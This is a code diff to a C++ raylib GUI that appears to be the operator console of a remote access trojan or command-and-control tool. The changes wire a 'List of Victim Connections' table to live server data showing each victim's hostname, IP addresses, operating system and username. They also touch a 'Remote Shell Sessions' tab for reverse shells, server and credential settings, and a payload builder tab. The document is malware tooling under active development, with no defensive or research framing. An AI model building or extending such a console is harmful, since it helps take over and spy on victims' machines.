@@ -2,6 +2,7 @@
 #include "Client.hpp"
 
 #include <raylib.h>
+#include <string>
 #include <thread>
 #include <vector>
 
@@ -159,7 +160,7 @@ int main() {
 
         // --- Status Bar ---
         Rectangle status = {0, state.res.height - 24, state.res.width, 24};
-        GuiStatusBar(status, "Version: 1.0 | Connections: 3 | Ports: 1");
+        GuiStatusBar(status, client.getStatusText());
 
         EndDrawing();
     }
@@ -185,7 +186,7 @@ void drawConnectionsTab(WindowState& state) {
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "List of Victim Connections");
 
     if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
-        //TODO: Fetch clients from server
+        Client::instance().fetchVictims();
     }
 
     Rectangle tableRect{0, 80, res.width, res.height - 90};
@@ -231,25 +232,32 @@ void drawConnectionsTab(WindowState& state) {
 
     BeginScissorMode(panelRect.x, panelRect.y, panelRect.width, panelRect.height);
 
-    int clients = 50;
-    const char* values[] = {
-        "1", "Laptop", "192.168.0.108", "8.8.8.8", "Linux",
-        "erarnitox", "Online"
-    };
+    const auto& victims = Client::instance().getVictims();
 
     colWidth = (tableRect.width-10) / colCount;
-    for (int client_id{ 0 }; client_id < clients; ++client_id) {
+    for (size_t client_id{ 0 }; client_id < victims.size(); ++client_id) {
         auto line_color = client_id % 2 == 0 ? Color{150, 20, 70, 255} : DARKGRAY;
 
         // Hover highlight
-        if (client_id == hoveredRow) {
+        if (static_cast<int>(client_id) == hoveredRow) {
             line_color = RED;
         }
+
+        const auto& vic{ victims[client_id] };
+        const std::string values[colCount]{
+            std::to_string(vic.id),
+            vic.hostname,
+            vic.internal_ip,
+            vic.external_ip,
+            vic.operating_system,
+            vic.username,
+            vic.status < 5 ? "ONLINE" : "OFFLINE"
+        };
 
         for (int i = 0; i < colCount; i++) {
             Rectangle r{tableRect.x + i * colWidth, tableRect.y + scroll.y + 26 + (25*client_id), colWidth, 24};
             GuiDrawRectangle(r, 1, BLACK, line_color);
-            GuiLabel(r, values[i]);
+            GuiLabel(r, values[i].c_str());
         }
     }
 
@@ -342,8 +350,9 @@ void drawLogin(WindowState& state) {
         WHITE
     );
 
-    if(state.wait_for_response) {
-        GuiTextBox((Rectangle){ popupRect.x + 250, popupRect.y + popupRect.height - 90, 300, 30 }, "Connecting! Please Stand by ...", 0, false);
+    if (state.wait_for_response) {
+        GuiTextBox((Rectangle){ popupRect.x + 250, popupRect.y + popupRect.height - 90, 300, 30 },
+            "Connecting! Please Stand by ...", 0, false);
         return;
     }
 
@@ -564,8 +573,9 @@ void drawSettingsTab(WindowState& state) {
     // Save button
     Rectangle saveButtonRect = { inputX, startY + spacing*5, 200, 30 };
     if (GuiButton(saveButtonRect, "Save Settings")) {
-        printf("Settings saved!\n");
-        printf("Username: %s\n", settings.username.text);
+        state.client.setUsername(settings.username.text);
+        state.client.setPassword(settings.password.text);
+        state.client.setServerUrl(settings.server_url.text);
     }
 }
 
@@ -581,13 +591,6 @@ void drawBuilderTab(WindowState& state) {
     GuiPanel(viewRect, "");
 }
 
-//TODO: remove
-struct Session {
-    std::string client;
-    int16_t port;
-    bool open;
-};
-
 //-------------------------------------------------
 //
 //-------------------------------------------------
@@ -602,13 +605,8 @@ void drawSessionsTab(WindowState& state) {
 
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "Remote Shell Sessions");
 
-    static std::vector<Session> sessions {
-        {"userName", 4444, true },
-        {"user2", 4444, true },
-        {"user3", 4444, true },
-        {"user4", 4444, true },
-        {"user5", 4444, true }
-    };
+    //TODO: get sessions from session manager
+    static std::vector<Session> sessions {};
 
     Rectangle viewRect{0, 80, res.width, res.height - 90};
 
@@ -641,7 +639,7 @@ void drawSessionsTab(WindowState& state) {
     }
 
     Session& session = sessions.at(selected_session);
-    GuiPanel(viewRect, TextFormat("Reverse Shell to Client %s on port %d", session.client.c_str(), session.port));
+    GuiPanel(viewRect, TextFormat("Reverse Shell to Client %s on port %d", session.uid.c_str(), session.port));
 
     //close session button
     if (GuiButton({viewRect.width - 130, viewRect.y + 2, 120, 20},  GuiIconText(ICON_CROSS, "Close Shell"))) {
